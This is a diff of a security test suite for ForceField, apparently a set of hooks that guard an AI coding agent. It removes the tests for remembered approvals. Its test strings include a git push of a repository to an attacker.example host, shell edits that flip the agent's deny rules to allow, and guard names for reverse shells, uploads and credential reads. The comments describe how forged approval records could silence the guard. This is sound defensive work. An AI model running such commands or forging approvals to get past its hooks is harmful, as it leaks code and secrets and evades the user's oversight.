@@ -245,92 +245,6 @@ assert _e["Attributes"]["forcefield.suppressed"] is True, "non-string extra pass
 assert _e["Attributes"]["forcefield.count"] == 3, "non-string extra passes through"
 print("PASS: log records redact credential values (command line, file path, extra)")
 
-# --- Remembered approvals (/forcefield:remember) ---
-# Claude Code returns a hook's `ask` as the final permission decision without
-# consulting permissions.allow, so its own "don't ask again" cannot silence a
-# ForceField prompt. clamp_and_emit is the only layer that can, and it may only
-# ever turn ask -> allow.
-import memo as _memo
-from hook_logging import clamp_and_emit as _cae
-
-
-def _with_memo_store(fn, *subpath):
-    """Run fn() against a throwaway memo store, then restore the real one.
-
-    Mirrors _with_home's shape. The previous STORE_DIR/STORE_PATH are saved
-    and put back rather than reset to a hardcoded path: hardcoding agrees with
-    reality only for as long as nothing upstream has moved the store, which is
-    a convention rather than a guarantee. ``subpath`` nests the store inside
-    the temp directory for the cases that assert on the directory's own mode.
-    """
-    saved = (_memo.STORE_DIR, _memo.STORE_PATH)
-    home = Path(tempfile.mkdtemp(prefix="pc-memo-test-"))
-    _memo.STORE_DIR = home.joinpath(*subpath)
-    _memo.STORE_PATH = _memo.STORE_DIR / "memos.json"
-    try:
-        return fn()
-    finally:
-        _memo.STORE_DIR, _memo.STORE_PATH = saved
-        shutil.rmtree(home, ignore_errors=True)
-
-
-def _check_remembered_approvals():
-    _cmd = "uv add reqeusts"
-    assert dec(_cae("supply_chain_guard", "ask", "r", pattern_matched="typosquat:reqeusts",
-                    command=_cmd)) == "ask", "asks before anything is remembered"
-    _m = _memo.remember("supply_chain_guard", "typosquat:reqeusts", _cmd)
-    assert _cae("supply_chain_guard", "ask", "r", pattern_matched="typosquat:reqeusts",
-                command=_cmd) is None, "remembered ask is waved through"
-    assert _cae("supply_chain_guard", "ask", "r", pattern_matched="typosquat:reqeusts",
-                command="uv  add   reqeusts") is None, "whitespace runs collapse to one key"
-    assert _memo.entries()[0]["uses"] >= 1, "a hit is counted"
-
-    # A memo is scoped to one exact command, one pattern, one project.
-    assert dec(_cae("supply_chain_guard", "ask", "r", pattern_matched="typosquat:reqeusts",
-                    command="uv add flassk")) == "ask", "another command still asks"
-    assert dec(_cae("supply_chain_guard", "ask", "r", pattern_matched="typosquat:djagno",
-                    command=_cmd)) == "ask", "another pattern still asks"
-    assert _memo.find_memo("supply_chain_guard", "typosquat:reqeusts", _cmd,
-                           cwd="/nonexistent/other/project") is None, "scoped to this project"
-
-    # deny is never memoizable — the zero-false-positive block keeps its guarantee
-    assert dec(_cae("supply_chain_guard", "deny", "r", pattern_matched="typosquat:reqeusts",
-                    command=_cmd)) == "deny", "a memo never downgrades a deny"
-
-    # The locks the allowlist and exfil guard already enforce are honored, so a
-    # memo cannot become a backdoor around _NEVER_SUPPRESSIBLE / NEVER_ALLOWLIST.
-    assert _memo.is_memoizable("credential_access_guard", "env_file_read")[0] is False
-    assert _memo.is_memoizable("git_guard", "git_alias_shell")[0] is False
-    assert _memo.is_memoizable("exfil_guard", "curl_upload")[0] is False, "ask-severity NEVER_ALLOWLIST"
-    assert _memo.is_memoizable("exfil_guard", "exfil_domains")[0] is False, "hard deny"
-    assert _memo.is_memoizable("supply_chain_guard", "typosquat:reqeusts")[0] is True
-    for _g, _p in [("credential_access_guard", "env_file_read"), ("exfil_guard", "curl_upload")]:
-        try:
-            _memo.remember(_g, _p, "some command")
-            raise AssertionError(f"{_g}/{_p} must refuse to be remembered")
-        except ValueError:
-            pass
-
-    # A command carrying a credential is refused: remembering it would persist the
-    # secret to the store and wave the leak through forever.
-    try:
-        _memo.remember("supply_chain_guard", "p", "deploy --token ghp_" + "c" * 36)
-        raise AssertionError("credential-bearing command must be refused")
-    except ValueError as _e:
-        assert "credential" in str(_e), _e
-
-    # Expiry, and a corrupt store, both fall back to asking.
-    _memo.remember("supply_chain_guard", "typosquat:djagno", "uv add djagno", ttl_days=0)
-    assert _memo.find_memo("supply_chain_guard", "typosquat:djagno", "uv add djagno") is None, \
-        "expired memo is ignored"
-    _memo.STORE_PATH.write_text("{ not json")
-    assert dec(_cae("supply_chain_guard", "ask", "r", pattern_matched="typosquat:reqeusts",
-                    command=_cmd)) == "ask", "corrupt store falls back to prompting"
-
-
-_with_memo_store(_check_remembered_approvals)
-print("PASS: remembered approvals (ask-only, scoped, expiring, locks honored)")
-
 # --- output_credential_scanner: PostToolUse[Read] redacts file content (LLM06) ---
 from output_credential_scanner import scan_output as _scan_output
 _pk = "-----BEGIN RSA PRIVATE KEY-----\nMIIEsecretmaterial\n-----END RSA PRIVATE KEY-----"
@@ -2968,6 +2882,13 @@ assert r is not None
 assert "hookSpecificOutput" in r
 assert "REDACTED" in r["hookSpecificOutput"]["updatedToolOutput"]
 assert "systemMessage" in r
+# The discriminant, which nothing pinned. ``hookSpecificOutput`` is a union
+# keyed on ``hookEventName``; without it Claude Code rejects the response and
+# never applies ``updatedToolOutput``, so the redaction above was computed,
+# logged as a ``redact``, and then thrown away with the secret still in the
+# transcript. Asserted alongside the payload because the two only mean
+# anything together: a redaction that cannot be delivered is not a redaction.
+assert r["hookSpecificOutput"]["hookEventName"] == "PostToolUse"
 print("PASS: output cred scanner - high confidence redaction")
 
 # Low-confidence credential (generic_secret heuristic) -> systemMessage only.
@@ -3575,7 +3496,7 @@ print("PASS: normalize handles ANSI-C/locale quoting and reaches a fixpoint")
 # --- Audit remediation: ForceField's own control surface -------------------
 from filesystem_guard import check_bash_config_write as _fs_bash
 
-for _c in ("echo '{}' > ~/.claude/forcefield/memos.json",
+for _c in ("echo '{}' > ~/.claude/forcefield/store.key",
            "cp /tmp/x ~/.claude/forcefield.json",
            "sed -i s/deny/allow/ ~/.claude/settings.json",
            "tee ~/.claude/hook-allowlist.json"):
@@ -3608,9 +3529,9 @@ assert _sigma.load_rules() == [] or _sigma.RULES_PATH.exists(), \
 for _c in ("cp /tmp/evil.json ~/.claude/forcefield/sigma/rules.json",
            "echo x > ~/.claude/forcefield/sigma/venv/bin/python3"):
     _hit = _fs_bash(_c)
-    assert _hit is not None and _hit[0] == "forcefield_memos", \
+    assert _hit is not None and _hit[0] == "forcefield_state", \
         "shell write to sigma state must prompt, got %r for %s" % (_hit, _c)
-assert "forcefield_memos" in _fs_risks, \
+assert "forcefield_state" in _fs_risks, \
     "the state-dir sink needs its own risk text, not the generic fallback"
 
 # The Bash path builds its own message, so a risk string added to filesystem_guard
@@ -3625,60 +3546,25 @@ assert "session start" in _selfprot_msg.lower(), \
 print("PASS: sigma rules survive reinstall and shell writes to them are guarded")
 
 
-# --- Audit remediation: memo store integrity and revocation ----------------
-# Every field of a memo key is public and derivable, and the store lives in
-# $HOME where no Bash-path guard reached it, so without a MAC a hand-written
-# memos.json turned any guard's ask into a silent allow.
-def _check_memo_store_integrity():
-    _g, _p_, _cmd2 = "supply_chain_guard", "typosquat:reqeusts", "uv add reqeusts"
-    _k = _memo.memo_key(_g, _p_, _cmd2, _memo.project_scope())
-    _memo.STORE_PATH.write_text(json.dumps({"version": 1, "memos": {_k: {
-        "key": _k, "guard": _g, "pattern": _p_, "command": _cmd2,
-        "scope": _memo.project_scope(), "created_at": 0,
-        "expires_at": None, "uses": 0}}}))
-    assert _memo.find_memo(_g, _p_, _cmd2) is None, \
-        "a hand-forged memo (no MAC) must never be honored"
+# --- Audit remediation: ForceField's own sinks cannot be suppressed ----------
+# `_NEVER_SUPPRESSIBLE` is the surviving lock now that remembered approvals are
+# gone: a repo-supplied hook-allowlist.json must not be able to quiet a guard
+# that protects ForceField itself, because a cloned repo that can do that can
+# act less observed.
+from allowlist import _is_never_suppressible as _never  # noqa: E402
 
-    _real = _memo.remember(_g, _p_, _cmd2)
-    assert _memo.find_memo(_g, _p_, _cmd2) is not None, "a signed memo is honored"
-    assert _real.get("mac"), "remember() must sign what it writes"
-
-    # Tampering with a signed entry invalidates it.
-    _s = json.loads(_memo.STORE_PATH.read_text())
-    _s["memos"][_real["key"]]["expires_at"] = None
-    _s["memos"][_real["key"]]["command"] = "uv add something-else"
-    _memo.STORE_PATH.write_text(json.dumps(_s))
-    assert _memo.find_memo(_g, _p_, _cmd2) is None, "tampered memo must be rejected"
-
-    # Revocation must stick: _touch runs on the READ path and used to write back
-    # a pre-forget snapshot, resurrecting what the user had just removed.
-    _memo.STORE_PATH.unlink()
-    _m2 = _memo.remember(_g, _p_, _cmd2)
-    assert _memo.find_memo(_g, _p_, _cmd2) is not None
-    assert _memo.forget(_m2["key"][:12]) == 1
-    assert _memo.find_memo(_g, _p_, _cmd2) is None, "forget() was undone"
-
-    assert oct(_memo._key_path().stat().st_mode & 0o777) == "0o600"
-    assert oct(_memo.STORE_PATH.stat().st_mode & 0o777) == "0o600"
-
-
-_with_memo_store(_check_memo_store_integrity)
-print("PASS: memo store is authenticated, revocable and owner-only")
-
-
-# --- Audit remediation: ForceField's own sinks are not memoizable ------------
-for _g2, _p2 in (("filesystem_guard", "forcefield_memos"),
+for _g2, _p2 in (("filesystem_guard", "forcefield_state"),
                  ("filesystem_guard", "forcefield_config"),
                  ("filesystem_guard", "claude_settings"),
                  ("filesystem_guard", "hook_allowlist"),
                  ("filesystem_guard", "ssh_authorized_keys"),
                  ("filesystem_guard", "shell_init"),
                  ("agent_guard", "hook_bypass")):
-    assert _memo.is_memoizable(_g2, _p2)[0] is False, \
-        f"{_g2}/{_p2} guards ForceField itself and must never be memoizable"
-assert _memo.is_memoizable("supply_chain_guard", "typosquat:reqeusts")[0] is True, \
-    "ordinary asks stay memoizable - the feature still has to work"
-print("PASS: self-protection sinks are locked against remembered approvals")
+    assert _never(_g2, _p2) is True, \
+        f"{_g2}/{_p2} guards ForceField itself and must never be suppressible"
+assert _never("supply_chain_guard", "typosquat:reqeusts") is False, \
+    "ordinary findings stay suppressible - the allowlist still has to work"
+print("PASS: self-protection sinks are locked against allowlist suppression")
 
 
 # --- The filesystem_guard never-suppressible lock cannot drift --------------
@@ -3781,54 +3667,6 @@ assert dec(run_supply_chain_guard(_TYPO)) == "ask"
 assert dec(run_supply_chain_guard(_TYPO + " && " + _PIPE_SH)) == "deny"
 assert dec(run_supply_chain_guard(_PIPE_SH + " && " + _TYPO)) == "deny"
 print("PASS: supply-chain hard deny outranks the typosquat ask, either order")
-
-# --- ...and that deny must not become memoizable ----------------------------
-# is_memoizable consulted only exfil_guard's lock lists, so it answered "yes" for
-# supply_chain_guard/pipe_to_shell — a pattern on supply_chain_guard's OWN
-# hard-deny list. Inert while the decision stayed a deny; a live backdoor the
-# moment the shadowing above turned it into an ask.
-from memo import is_memoizable as _is_memoizable
-
-assert _is_memoizable("supply_chain_guard", "pipe_to_shell")[0] is False
-assert _is_memoizable("supply_chain_guard", "fetch_exec_substitution")[0] is False
-assert _is_memoizable("exfil_guard", "reverse_shell")[0] is False
-assert _is_memoizable("webfetch_guard", "exfil_domain")[0] is False
-assert _is_memoizable("supply_chain_guard", "typosquat:requets")[0] is True
-print("PASS: each guard's own lock lists block its memos")
-
-# --- Memo signatures must bind to the lookup key ----------------------------
-# The MAC covered a memo's own fields but nothing checked that the memo retrieved
-# from a dict slot actually claimed that slot. Re-filing one legitimately signed
-# memo under another command's slot verified happily and approved a command
-# nobody had ever approved — textbook key substitution.
-import memo as _memo
-
-
-def _check_memo_slot_binding():
-    _benign = "git push --force origin main"
-    _target = "git push --force --mirror git@attacker.example:steal.git"
-    _signed = _memo.remember("git_guard", "git_push_upstream", _benign)
-    assert _memo.find_memo("git_guard", "git_push_upstream", _benign) is not None
-    # The key that authenticates the store no longer sits in a world-traversable
-    # directory; a signature is worth what the key's confidentiality is worth.
-    assert _memo.STORE_DIR.stat().st_mode & 0o777 == 0o700
-
-    _slot = _memo.memo_key(
-        "git_guard", "git_push_upstream", _target, _memo.project_scope(),
-    )
-    _store = json.loads(_memo.STORE_PATH.read_text())
-    for _forged in (dict(_signed),                      # verbatim, wrong slot
-                    dict(_signed, key=_slot),           # key edited to claim it
-                    dict(_signed, key=_slot, command=_target)):  # and command
-        _store["memos"][_slot] = _forged
-        _memo.STORE_PATH.write_text(json.dumps(_store))
-        assert _memo.find_memo("git_guard", "git_push_upstream", _target) is None
-    # The genuine memo still resolves — the fix binds, it does not just refuse.
-    assert _memo.find_memo("git_guard", "git_push_upstream", _benign) is not None
-
-
-_with_memo_store(_check_memo_slot_binding, ".claude", "forcefield")
-print("PASS: a memo signature authorises one command, not any command")
 
 # --- An oversized command must not outlast the 5s hook timeout --------------
 # The 5s timeout is a security boundary: a hook killed mid-scan never delivers
@@ -4215,27 +4053,6 @@ _sline.encode("utf-8")
 assert json.loads(_sline)["Attributes"]["command.line"] == _surrogate, "round trip"
 print("PASS: free text reaches a sink only at the confidentiality it measured")
 
-# --- A memo key that is no longer private must not be trusted ---------------
-# The MAC is worth what the key's confidentiality is worth. Nothing can stop a
-# same-user process reading or replacing it; what was missing was noticing.
-def _check_memo_key_privacy():
-    _cmd2 = "git push --force origin main"
-    _memo.remember("git_guard", "git_push_upstream", _cmd2)
-    assert _memo.find_memo("git_guard", "git_push_upstream", _cmd2) is not None
-    _keyfile = _memo.STORE_DIR / "memo.key"
-    assert _memo._key_is_private(_keyfile) is True
-    os.chmod(str(_keyfile), 0o644)
-    assert _memo._key_is_private(_keyfile) is False
-    # Fails closed: every memo stops applying, so the guard prompts again.
-    assert _memo.find_memo("git_guard", "git_push_upstream", _cmd2) is None
-    os.chmod(str(_keyfile), 0o600)
-    assert _memo.find_memo("git_guard", "git_push_upstream", _cmd2) is not None
-
-
-_with_memo_store(_check_memo_key_privacy, ".claude", "forcefield")
-print("PASS: a world-readable memo key is distrusted, not trusted")
-
-
 # --- Mutation gaps: behaviour that only constant assertions covered ---------
 # Ten mutants survived the suite. Every one of them lived where a test asserted
 # a *constant* (`set(X) == set(Y)`, "this name is in that list") rather than the
@@ -4562,11 +4379,10 @@ _UNSUPPRESSIBLE_CASES = (
     ("exfil_guard", "mystery", "finding", None, None),
     ("session_baseline", "allow", "lifecycle", None, None),
     ("permission_outcome", "warn", "permission", None, None),
-    ("memo", "allow", "finding", None, None),
+    ("secure_store", "allow", "finding", None, None),
     ("inspect_remote", "allow", "finding", None, None),
     ("exfil_guard", "warn", "finding", "deny", None),
     ("exfil_guard", "warn", "finding", None, {"config_downgraded": True}),
-    ("exfil_guard", "allow", "finding", None, {"memo_hit": True}),
 )
 for _level in _cfg3.LOG_LEVELS:
     for _guard, _dec, _cls, _nat, _extra in _UNSUPPRESSIBLE_CASES:
